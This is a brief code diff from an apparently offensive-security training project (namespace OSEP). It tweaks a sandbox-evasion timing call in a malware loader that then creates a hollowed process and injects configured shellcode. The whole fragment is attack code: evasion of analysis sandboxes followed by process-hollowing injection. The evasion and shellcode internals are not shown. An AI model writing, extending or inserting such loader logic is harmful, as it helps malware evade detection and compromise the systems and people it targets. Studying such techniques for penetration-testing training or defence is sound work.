@@ -16,7 +16,7 @@ namespace OSEP
         {
 
             if (CONFIG.DETECT_SANDBOX_TIME)
-                Evasion.SandboxTimeDetect();
+                Evasion.SandboxTimeDetect(2000);
 
             CreateHollowProcess chp = new CreateHollowProcess(CONFIG.HOLLOW_BINARY_TARGET, CONFIG.SHELLCODE);
             chp.StartProcess();
